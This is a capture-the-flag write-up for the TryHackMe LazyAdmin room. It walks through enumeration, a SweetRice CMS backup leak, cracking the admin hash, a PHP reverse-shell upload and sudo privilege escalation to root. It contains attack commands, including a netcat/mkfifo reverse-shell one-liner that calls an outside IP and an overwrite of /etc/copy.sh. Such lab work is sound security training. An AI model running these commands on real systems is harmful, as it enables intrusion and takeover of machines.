# TryHackMe | [LazyAdmin](https://tryhackme.com/room/lazyadmin)

## What is the user flag?

First, we will enumerate our target.

```bash
❯ nmap -sV 10.10.39.105
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-12 11:35 IST
Nmap scan report for 10.10.39.105
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 20.10 seconds
```

As we can see, two ports are open on our target machine, port 22 for ssh and port 80 with http. Let's see what we have on port 80.

![Apache](/images/apache2.png)

It is an Apache2 Ubuntu Default Page. Now we use gobuster to enumerate any directories this server might have.

```bash
❯ gobuster dir -u 10.10.39.105 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -q
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.39.105/content/]
/index.html           (Status: 200) [Size: 11321]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
```

We have found a /content subdirectory.

![Content](/images/sweetrice.png)

Let's enumerate it too.

```bash
❯ gobuster dir -u 10.10.39.105/content -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -q
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.39.105/content/_themes/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.39.105/content/as/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.39.105/content/attachment/]
/changelog.txt        (Status: 200) [Size: 18013]
/images               (Status: 301) [Size: 321] [--> http://10.10.39.105/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.39.105/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [Size: 317] [--> http://10.10.39.105/content/js/]
/license.txt          (Status: 200) [Size: 15410]
```

We have found some interesting files. Let's check the changelog.txt.

```
#############################################
SweetRice - Simple Website Management System
Version 1.5.0
Author:Hiler Liu steelcal@gmail.com
Home page:http://www.basic-cms.org/
#############################################
New web - new SweetRice for both PC & mobile website creator,easy way to follow the new web world.

========================================
```

We know now that the target machine is using SweetRice CMS V1.5.0. Let's search [Exploit-DB](https://www.exploit-db.com/) for a vulnerability we can exploit.

We find a [Backup Disclosure](https://www.exploit-db.com/exploits/40718) vulnerability. Let's use it to exploit this CMS.

![MySql](/images/mysql_backup.png)

We download and open the mysql_bakup_20191129023059-1.5.1.sql file.

We now have a username and a password hash. Let's crack the hash using hashcat.

```bash
❯ hashcat -a 0 -m 0 lazyhash.txt /usr/share/wordlists/rockyou.txt

42f749ade7f9e195bf475f37a44cafcb:[REDACTED]
```

![Login](/images/login.png)

So we now have both the username and the password. Let's log into the admin panel.

![Admin Panel](/images/admin_panel.png)

We now have to set the website status to Running so that we can access the site.

![Website](/images/website.png)

There's nothing interesting on the site itself. Let's look if there's another vulnerability we can exploit.

We have found an [Arbitrary File Upload](https://www.exploit-db.com/exploits/40716) vulnurablity. We can exploit it to upload a reverse shell script and gain access to the target machine.

We're going to use [pentestmonkey's reverse ssh php script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).

```bash

+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.39.105/content/attachment/shell.php5
```

p.s : if it doesn't seem to work, try to hardcode the values in the code.

![Shell](/images/file_upload.png)

Now we start a netcat listener on the specified port to connect to the reverse shell.

```bash
❯ nc -nlvp 1234
Connection from 10.10.39.105:44046
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 09:34:23 up 33 min,  0 users,  load average: 0.00, 0.01, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Annddddd we're in.

Let's navigate the file system to find the user.txt.

```bash
$ cd /home
$ ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
[DATA EXPUNGED]
```

## What is the root flag?

We now have to escalate our priviledge and gain root access on this machine.

Let's check what commands we can run.

```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

We can run the perl file backup.pl. Let's check what's in it.

```bash
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

The backup.pl script executes /etc/copy.sh. What's in there i wonder.

```bash
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

```

We can run this file as root, so if we create a reverse shell using this file, we can get root access to the target machine from our host macine.

We already have a reverse shell script on this machine, so why not reuse it.

```bash
$ echo 'php /var/www/html/content/attachment/shell.php5' > /etc/copy.sh
```

Now we have to run backup.pl as root.

```bash
$ sudo /usr/bin/perl /home/itguy/backup.pl
$ Successfully opened reverse shell to 10.17.15.106:1234
```

We now have root access to this machine. All we have to do is to locate root.txt (it is usually found in /root).

```bash
❯ nc -nlvp 1234
Connection from 10.10.39.105:44052
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 09:46:00 up 44 min,  0 users,  load average: 0,00, 0,00, 0,09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
[DATA EXPUNGED]

```
